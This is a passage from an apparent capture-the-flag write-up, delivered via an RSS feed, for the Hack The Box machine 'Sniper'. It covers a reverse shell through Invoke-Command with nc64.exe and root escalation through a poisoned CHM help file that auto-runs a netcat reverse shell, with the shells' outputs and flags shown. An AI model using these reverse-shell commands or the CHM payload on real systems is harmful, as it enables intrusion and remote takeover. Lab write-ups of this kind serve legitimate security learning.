&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And then ran that to get a second reverse shell:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Invoke-Command -ComputerName SNIPER -ScriptBlock { C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9002 -e powershell.exe } -Credential $creds&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And the subsquent user flag:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\Docs&amp;gt; type C:\Users\Chris\Desktop\user.txt
type C:\Users\Chris\Desktop\user.txt
21f4d0f29fc4dd867500c1ad716cf56e
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Next onto root, some basic enum of the root dir (C:) shows an interesting and unusual “docs” folder..&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;PS C:\Docs&amp;gt; dir

    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Docs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2019   9&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;31 AM            285 note.tx
-a----        4/11/2019   9&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;17 AM         552607 php &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; dummies-trial.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lets have a look at that note:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PS C:\Docs&amp;gt; type note.txt

Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.

Regards,
Sniper CEO.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So this seems to be hinting at an exploit involving CHM (Compiled Help Files for Windows). I sought to narrow down what CHM files existed on the box:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$dir = Get-ChildItem C:\ -recurse -file -force -ErrorAction SilentlyContinue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This pulls all visible files from the C:\ drive into a variable (thats a big list..) and we then narrow it down to just CHM files:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$List = $Dir | where {$_.extension -eq &amp;quot;.chm&amp;quot;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Having glossed over all of them, the most obvious one is the first in the list:&lt;/p&gt;
&lt;p&gt;$List | format-table name,directory | select -first 10&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Name                                                        Directory
----                                                        ---------
instructions.chm                                            C:\Users\Chris\Downloads
cliconf.chm                                                 C:\Windows\Help\mui\0409
mmc.CHM                                                     C:\Windows\Help\mui\0409
msdasc.chm                                                  C:\Windows\Help\mui\0409
msorcl32.chm                                                C:\Windows\Help\mui\0409
odbcinst.chm                                                C:\Windows\Help\mui\0409
odbcjet.chm                                                 C:\Windows\Help\mui\0409
sqlsodbc.chm                                                C:\Windows\Help\mui\0409
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ve downloaded a copy of this (via SMB) in order to look into it further.&lt;/p&gt;
&lt;p&gt;In a nutshell this is going to be a poisoned CHM exploit:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&#34; target=&#34;_blank&#34;&gt;Poison CHM Gist&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Lets do this manually first. On a Windows machine I decompiled the CHM file we got from Chris using something called &lt;a href=&#34;http://keyworks.helpmvp.com/home/keytools&#34; target=&#34;_blank&#34;&gt;KeyTools&lt;/a&gt;
 - this allows you to decompile CHM files so their contents can be modified. This isn&amp;rsquo;t necessary but I chose to do it as a learning exercise. Once extracted, I created a copy of the single html file in there, and added the exploit as described in the above link:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;OBJECT id=x classid=&amp;quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&amp;quot; width=1 height=1&amp;gt;
  &amp;lt;PARAM name=&amp;quot;Command&amp;quot; value=&amp;quot;ShortCut&amp;quot;&amp;gt;
  &amp;lt;PARAM name=&amp;quot;Button&amp;quot; value=&amp;quot;Bitmap::shortcut&amp;quot;&amp;gt;
  &amp;lt;PARAM name=&amp;quot;Item1&amp;quot; value=&#39;,cmd.exe,/c C:\Users\Chris\Documents\nc64.exe 10.10.14.23 9003 -e powershell.exe&#39;&amp;gt;
  &amp;lt;PARAM name=&amp;quot;Item2&amp;quot; value=&amp;quot;273,1,1&amp;quot;&amp;gt;
&amp;lt;/OBJECT&amp;gt;
&amp;lt;SCRIPT&amp;gt;
  x.Click();
&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From there, we can download &lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=21138&#34; target=&#34;_blank&#34;&gt;HTML Help Workshop&lt;/a&gt;
 and recompile the CHM file inclusive of our newly poisoned HTML doc. You can also compile a new project from scratch to do this, completely omitting KeyTools altogether.&lt;/p&gt;
&lt;p&gt;For me, getting this to actually work was massively hit and miss. A good test before running this is to get the box to ping you via &lt;code&gt;ping -n 2 &amp;lt;IP.ADDRESS&amp;gt;&lt;/code&gt; - changing the value of the Item1 parameter in our XML code above will acheive this.&lt;/p&gt;
&lt;p&gt;Once confirmed I compiled the CHM with the nc64.exe line and moved it into C:\Docs - with a listener running. After a few attempts we get a call back:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;skynet Boxes/Sniper » nc -nlvp 9003
Connection from 10.10.10.151:49719
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&amp;gt; whoami
sniper\administrator

PS C:\Windows\system32&amp;gt; hostname
Sniper

PS C:\Windows\system32&amp;gt; type C:\Users\Administrator\Desktop\root.txt
5624caf363e2750e994f6be0b7436c15
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Result!&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
